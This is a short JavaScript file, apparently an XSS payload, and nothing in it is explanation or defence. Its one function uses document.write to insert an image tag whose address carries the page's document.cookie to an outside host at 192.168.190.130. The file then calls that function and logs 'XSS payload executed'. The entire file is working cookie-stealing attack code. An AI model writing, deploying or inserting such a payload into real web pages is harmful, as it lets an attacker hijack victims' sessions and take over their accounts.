function xssPayload() {
  document.write('<img src="http://192.168.190.130/x?cookie=' + document.cookie + '" />')

}

console.log('XSS payload executed');
xssPayload();
